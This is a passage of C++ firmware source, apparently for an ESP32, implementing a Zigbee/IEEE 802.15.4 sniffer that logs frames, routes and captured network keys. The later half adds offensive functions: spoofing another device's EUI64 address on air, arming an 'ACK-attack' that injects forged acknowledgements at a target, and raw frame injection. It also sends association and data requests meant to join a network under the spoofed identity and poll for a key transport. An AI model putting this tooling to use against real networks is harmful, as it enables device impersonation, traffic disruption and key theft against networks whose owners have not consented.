        if (h->connected_hosts.size() > 0) {
            Serial.print("\n   connected:");
              for (int j = 0; j < h->connected_hosts.size(); j++) {  //  check uniq
                  Serial.printf(" 0x%04X", h->connected_hosts.get(j));
              }
        }
        Serial.println();
    }
    Serial.println("------------------------------------------------------------------------\n");
}

// -- Serial output -------------------------------------------------------------
void IEEE802154Sniffer::_printFrame(const FrameInfo &info) {
    char srcBuf[SNIFFER_MAX_LABEL_LEN + 4];
    char dstBuf[SNIFFER_MAX_LABEL_LEN + 4];
    char nwkSrcBuf[SNIFFER_MAX_LABEL_LEN + 4];
    char nwkDstBuf[SNIFFER_MAX_LABEL_LEN + 4];

    addrLabel(info.macSrc, srcBuf, sizeof(srcBuf));
    addrLabel(info.macDst, dstBuf, sizeof(dstBuf));

    if (!info.hasRoute || (info.route.nwkSrc == info.macSrc &&
                            info.route.nwkDst == info.macDst &&
                            info.route.hopCount == 0)) {
        Serial.printf("[%02u] %-8s  %-12s→%-12s  PAN:%04X  %-10s  RSSI:%3d LQI:%3u  %3uB\n",
            info.channel, info.protocolName,
            srcBuf, dstBuf, info.panId,
            info.functionName ? info.functionName : "",
            info.rssi, info.lqi, info.len);
    } else {
        addrLabel(info.route.nwkSrc, nwkSrcBuf, sizeof(nwkSrcBuf));
        addrLabel(info.route.nwkDst, nwkDstBuf, sizeof(nwkDstBuf));

        Serial.printf("[%02u] %-8s  MAC:%-10s→%-10s  NWK:%-10s→%-10s",
            info.channel, info.protocolName,
            srcBuf, dstBuf, nwkSrcBuf, nwkDstBuf);

        if (info.route.hopCount > 0) {
            Serial.print("  Route:[");
            Serial.print(nwkSrcBuf);
            for (uint8_t i = 0; i < info.route.hopCount; i++) {
                char relayBuf[SNIFFER_MAX_LABEL_LEN + 4];
                addrLabel(info.route.relays[i], relayBuf, sizeof(relayBuf));
                Serial.printf("→%s", relayBuf);
            }
            Serial.printf("→%s]", nwkDstBuf);
        }

        Serial.printf("  %-10s  RSSI:%3d LQI:%3u  %3uB\n",
            info.functionName ? info.functionName : "",
            info.rssi, info.lqi, info.len);
    }
}

// -- Name tables ---------------------------------------------------------------
const char *IEEE802154Sniffer::_frameTypeName(uint8_t t) {
    switch (t) {
        case 0: return "Beacon";  case 1: return "Data";
        case 2: return "ACK";     case 3: return "MAC Cmd";
        case 5: return "Multi";   case 6: return "Frag";
        default: return "Unknown";
    }
}

const char *IEEE802154Sniffer::_zbNwkCmdName(uint8_t c) {
    switch (c) {
        case 0x01: return "Route Request";    case 0x02: return "Route Reply";
        case 0x03: return "Network Status";   case 0x04: return "Leave";
        case 0x05: return "Route Record";     case 0x06: return "Rejoin Req";
        case 0x07: return "Rejoin Rsp";       case 0x08: return "Link Status";
        case 0x09: return "Network Report";   case 0x0A: return "Network Update";
        case 0x0B: return "ED Timeout Req";   case 0x0C: return "ED Timeout Rsp";
        default:   return "NWK Cmd";
    }
}

// -- Key management ------------------------------------------------------------

bool IEEE802154Sniffer::addKey(ZbKeyType type, const uint8_t *key16,
                                uint8_t seqNum, const char *label) {
    if (!key16) return false;

    // Check for duplicate (same type + seqNum)
    for (int i = 0; i < keys.size(); i++) {
        ZbKey *k = keys.get(i);
        if (k->type == type && k->seqNum == seqNum) {
            // Update existing key
            memcpy(k->key, key16, ZIGBEE_KEY_LEN);
            k->capturedAt_ms = millis();
            if (label) strncpy(k->label, label, sizeof(k->label) - 1);
            Serial.printf("[Keys] Updated %s key seq=%u\n",
                          type == ZbKeyType::NETWORK ? "Network" : "TCLK", seqNum);
            return true;
        }
    }

    // Add new key
    ZbKey *k = new ZbKey();
    k->type          = type;
    k->seqNum        = seqNum;
    k->capturedAt_ms = millis();
    memcpy(k->key, key16, ZIGBEE_KEY_LEN);
    memset(k->label, 0, sizeof(k->label));
    if (label) strncpy(k->label, label, sizeof(k->label) - 1);
    keys.add(k);

    Serial.printf("[Keys] Added %s key seq=%u label='%s'\n",
                  type == ZbKeyType::NETWORK           ? "Network" :
                  type == ZbKeyType::TRUST_CENTER_LINK ? "TCLK"    : "App",
                  seqNum, k->label);
    return true;
}

ZbKey *IEEE802154Sniffer::findNetworkKey(uint8_t seqNum) {
    for (int i = 0; i < keys.size(); i++) {
        ZbKey *k = keys.get(i);
        if (k->type == ZbKeyType::NETWORK && k->seqNum == seqNum) return k;
    }
    return nullptr;
}

ZbKey *IEEE802154Sniffer::findLatestNetworkKey() {
    ZbKey *latest = nullptr;
    for (int i = 0; i < keys.size(); i++) {
        ZbKey *k = keys.get(i);
        if (k->type != ZbKeyType::NETWORK) continue;
        if (!latest || k->capturedAt_ms >= latest->capturedAt_ms) latest = k;
    }
    return latest;
}

bool IEEE802154Sniffer::hasNetworkKey() {
    for (int i = 0; i < keys.size(); i++) {
        if (keys.get(i)->type == ZbKeyType::NETWORK) return true;
    }
    return false;
}

void IEEE802154Sniffer::printKeys() {
    Serial.println("\n-- Zigbee Keys --------------------------------------------------");
    Serial.println("  Type        Seq  Label            Key");
    Serial.println("  --------------------------------------------------------------");
    for (int i = 0; i < keys.size(); i++) {
        ZbKey *k = keys.get(i);
        const char *tname = k->type == ZbKeyType::NETWORK           ? "Network   " :
                            k->type == ZbKeyType::TRUST_CENTER_LINK ? "TCLK      " : "App       ";
        Serial.printf("  %s %3u  %-16s ", tname, k->seqNum, k->label);
        for (int j = 0; j < ZIGBEE_KEY_LEN; j++)
            Serial.printf("%02X%s", k->key[j], j < ZIGBEE_KEY_LEN-1 ? ":" : "");
        if (k->capturedAt_ms > 0 && k->type != ZbKeyType::TRUST_CENTER_LINK)
            Serial.printf("  (sniffed +%lus)", k->capturedAt_ms / 1000);
        Serial.println();
    }
    Serial.println("----------------------------------------------------------------\n");
}

// -- Zigbee NWK security header extraction ------------------------------------
// NWK security header layout (when zbNwkSecurityEnabled):
//   Aux frame control (1) | frame counter (4) | src address (0 or 8) |
//   key seq num (1) | MIC (4) | payload (encrypted)
bool IEEE802154Sniffer::_extractSecurityHeader(const uint8_t *p, uint8_t len,
                                                uint32_t &frameCounter,
                                                uint8_t &keySeqNum) {
    if (len < 6) return false;
    uint8_t auxCtrl = p[0];
    // bits[4:3] = key identifier mode (00=data,01=NWK,10=key-transport,11=key-load)
    uint8_t keyIdMode = (auxCtrl >> 3) & 0x03;
    bool    hasExtSrc = (auxCtrl >> 6) & 0x01;

    frameCounter = (uint32_t)p[1] | ((uint32_t)p[2] << 8) |
                   ((uint32_t)p[3] << 16) | ((uint32_t)p[4] << 24);

    uint8_t off = 5;
    if (hasExtSrc && off + 8 <= len) off += 8;  // skip extended src

    if (off + 1 <= len) {
        keySeqNum = p[off];
        return true;
    }
    return false;
}

// -- Intercept network key from APS Transport Key command ---------------------
// When a device joins, coordinator sends NWK key encrypted with TCLK.
// APS layer command 0x05 = Transport Key, key type 0x01 = Network Key.
// Without decryption we can at least detect the event and log the key seq num.
// Full decryption via mbedtls AES-128-CCM* to be added later.
bool IEEE802154Sniffer::_tryExtractNetworkKey(const FrameInfo &info,
                                               const uint8_t *payload,
                                               uint8_t payloadLen) {
    // Only relevant for encrypted NWK frames with APS data
    if (!info.zbNwkSecurityEnabled) return false;
    if (payloadLen < 10) return false;

    uint32_t frameCounter = 0;
    uint8_t  keySeqNum    = 0;
    if (!_extractSecurityHeader(payload, payloadLen, frameCounter, keySeqNum)) {
        return false;
    }

    // Log the security header - decryption attempt comes in a future step
    Serial.printf("[Keys] Encrypted NWK frame: src=0x%04X seq=%u fc=%lu\n",
                  info.route.nwkSrc, keySeqNum, frameCounter);

    // If we already have a network key for this seq num, note it's in use
    ZbKey *nk = findNetworkKey(keySeqNum);
    if (nk) {
        Serial.printf("[Keys] Known network key seq=%u active\n", keySeqNum);
    } else {
        Serial.printf("[Keys] Unknown network key seq=%u - need capture\n", keySeqNum);
    }

    return false;  // decryption not yet implemented - returns true when key extracted
}

// -- Raw TX helper ---------------------------------------------------------
// Shared plumbing for injecting a raw MAC frame. Must stop RX before TX since
// the radio is half-duplex; resumes RX immediately after.
bool IEEE802154Sniffer::sendRawFrame(const uint8_t *frame, uint8_t frameLen) {
    if (frameLen == 0 || frameLen > SNIFFER_MAX_FRAME_LEN - 3) return false;

    // IDF transmit — prepend length byte (includes 2-byte FCS appended by radio)
    uint8_t txBuf[SNIFFER_MAX_FRAME_LEN];
    txBuf[0] = frameLen + 2;  // length = frame + FCS
    memcpy(&txBuf[1], frame, frameLen);

    esp_ieee802154_sleep();
    esp_err_t err = esp_ieee802154_transmit(txBuf, false);
    delay(5);
    esp_ieee802154_receive();  // back to RX
    _running = true;

    if (err != ESP_OK) {
        log_w("sendRawFrame: tx failed %d", err);
        return false;
    }
    return true;
}

// -- EUI64 spoofing ------------------------------------------------------------
// _ownEUI64 uses the same integer convention as HostRecord::extAddr and the
// nonce/TX builders (byte i at bit 8*i == on-air byte i), so a value copied
// straight from a host record reproduces that device's address on air.
void IEEE802154Sniffer::setOwnEUI64(uint64_t eui64) {
    _ownEUI64 = eui64;
    uint8_t buf[8];
    for (int i = 0; i < 8; i++) buf[i] = (uint8_t)(eui64 >> (8 * i));  // on-air LE
    esp_ieee802154_set_extended_address(buf);
    Serial.printf("[Spoof] Own EUI64 set to %016llX%s\n",
                  eui64, (eui64 == _hwEUI64) ? " (hardware)" : " (SPOOFED)");
}

void IEEE802154Sniffer::restoreOwnEUI64() {
    _ownEUI64 = _hwEUI64;
    esp_ieee802154_set_extended_address(_hwEUI64Bytes);
    Serial.printf("[Spoof] Own EUI64 restored to hardware %016llX\n", _hwEUI64);
}

// -- MAC ACK injection (slow path) ---------------------------------------------
bool IEEE802154Sniffer::sendAck(uint8_t seqNum) {
    uint8_t frame[3];
    frame[0] = 0x02;   // FC low: type=ACK(2), no security
    frame[1] = 0x00;   // FC high: no addressing
    frame[2] = seqNum;
    return sendRawFrame(frame, sizeof(frame));
}

// -- ACK-attack control (fast path lives in rxCallback) ------------------------
void IEEE802154Sniffer::startAckAttack(uint16_t target) {
    _ackAttackTarget = target;
    _ackAttackCount  = 0;
    _ackAttackActive = true;
    Serial.printf("[ATTACK] ACK-attack armed against 0x%04X — spoofing ACKs from RX ISR\n",
                  target);
}

void IEEE802154Sniffer::stopAckAttack() {
    _ackAttackActive = false;
    Serial.printf("[ATTACK] ACK-attack stopped (0x%04X, %lu ACKs injected)\n",
                  _ackAttackTarget, (unsigned long)_ackAttackCount);
}

// -- Beacon Request TX ---------------------------------------------------------
// Sends a MAC beacon request (Cmd 0x07) broadcast on the current channel.
// Used for active scanning — solicits beacon responses from coordinators/routers.
bool IEEE802154Sniffer::sendBeaconRequest() {
    // MAC Beacon Request frame (9 bytes):
    // FC(2) | Seq(1) | DST_PAN(2) | DST(2) | Cmd(1) = 0x07
    static uint8_t seq = 0;

    uint8_t frame[9];
    // Frame Control: type=MAC Cmd(3), no security, dst=short, src=none, pan compress
    frame[0] = 0x03;  // FC low: type=3 (MAC cmd), no security
    frame[1] = 0x08;  // FC high: dst addr mode=short(2<<2), src addr mode=none(0<<6)
    frame[2] = seq++; // sequence number
    frame[3] = 0xFF;  // dst PAN low (broadcast)
    frame[4] = 0xFF;  // dst PAN high
    frame[5] = 0xFF;  // dst addr low (broadcast)
    frame[6] = 0xFF;  // dst addr high
    frame[7] = 0x07;  // MAC Cmd: Beacon Request

    if (!sendRawFrame(frame, sizeof(frame))) {
        log_w("sendBeaconRequest: tx failed");
        return false;
    }
    log_d("sendBeaconRequest: sent on ch %u", _channel);
    return true;
}

// -- Association Request TX -----------------------------------------------------
// Sends a MAC Association Request (Cmd 0x01) to a specific parent (coordinator
// or router) that is advertising association-permit in its beacon. We have no
// short address yet, so we address ourselves by our extended (EUI64) address
// and use the "not yet associated" source PAN 0xFFFF, per 802.15.4 5.3.1.
bool IEEE802154Sniffer::sendAssociationRequest(uint16_t dstPan, uint16_t dstShortAddr,
                                                uint8_t capabilityInfo) {
    static uint8_t seq = 0;

    uint8_t frame[19];
    frame[0] = 0x23;  // FC low: MAC cmd, ack request=1
    frame[1] = 0xC8;  // FC high: dst addr mode=short(2<<2), src addr mode=extended(3<<6)
    frame[2] = seq++;
    frame[3] = (uint8_t)(dstPan & 0xFF);
    frame[4] = (uint8_t)(dstPan >> 8);
    frame[5] = (uint8_t)(dstShortAddr & 0xFF);
    frame[6] = (uint8_t)(dstShortAddr >> 8);
    frame[7] = 0xFF;  // src PAN low (0xFFFF = not associated)
    frame[8] = 0xFF;  // src PAN high
    for (int i = 0; i < 8; i++)
        frame[9 + i] = (uint8_t)(_ownEUI64 >> (8 * i));  // src EUI64, wire order (LE)
    frame[17] = MAC_CMD_ASSOC_REQUEST;
    frame[18] = capabilityInfo;

    if (!sendRawFrame(frame, sizeof(frame))) {
        log_w("sendAssociationRequest: tx failed");
        return false;
    }
    log_d("sendAssociationRequest: sent to pan=0x%04X addr=0x%04X cap=0x%02X",
          dstPan, dstShortAddr, capabilityInfo);
    return true;
}

// -- Data Request TX -------------------------------------------------------------
// Polls a parent for a queued (indirect-transmission) frame, e.g. the pending
// Association Response or Transport Key. Before association completes we have
// no short address, so we must poll using our extended address (useOwnShortAddr
// =false); afterwards use the short address the parent assigned to us.
bool IEEE802154Sniffer::sendDataRequest(uint16_t dstPan, uint16_t dstShortAddr,
                                         bool useOwnShortAddr, uint16_t ownShortAddr) {
    static uint8_t seq = 0;
    uint8_t frame[18];
    uint8_t len;

    if (useOwnShortAddr) {
        // PAN ID compressed (src PAN == dst PAN), short/short addressing.
        frame[0] = 0x63;  // FC low: MAC cmd, ack request=1, PAN ID compression=1
        frame[1] = 0x88;  // FC high: dst addr mode=short(2<<2), src addr mode=short(2<<6)
        frame[2] = seq++;
        frame[3] = (uint8_t)(dstPan & 0xFF);
        frame[4] = (uint8_t)(dstPan >> 8);
        frame[5] = (uint8_t)(dstShortAddr & 0xFF);
        frame[6] = (uint8_t)(dstShortAddr >> 8);
        frame[7] = (uint8_t)(ownShortAddr & 0xFF);
        frame[8] = (uint8_t)(ownShortAddr >> 8);
        frame[9] = MAC_CMD_DATA_REQUEST;
        len = 10;
    } else {
        // Not associated yet: short/extended addressing, src PAN 0xFFFF.
        frame[0] = 0x23;  // FC low: MAC cmd, ack request=1
        frame[1] = 0xC8;  // FC high: dst addr mode=short(2<<2), src addr mode=extended(3<<6)
        frame[2] = seq++;
        frame[3] = (uint8_t)(dstPan & 0xFF);
        frame[4] = (uint8_t)(dstPan >> 8);
        frame[5] = (uint8_t)(dstShortAddr & 0xFF);
        frame[6] = (uint8_t)(dstShortAddr >> 8);
        frame[7] = 0xFF;
        frame[8] = 0xFF;
        for (int i = 0; i < 8; i++)
            frame[9 + i] = (uint8_t)(_ownEUI64 >> (8 * i));
        frame[17] = MAC_CMD_DATA_REQUEST;
        len = 18;
    }

    if (!sendRawFrame(frame, len)) {
        log_w("sendDataRequest: tx failed");
        return false;
    }
    log_d("sendDataRequest: polled pan=0x%04X addr=0x%04X (ownShort=%d)",
          dstPan, dstShortAddr, useOwnShortAddr);
    return true;
}
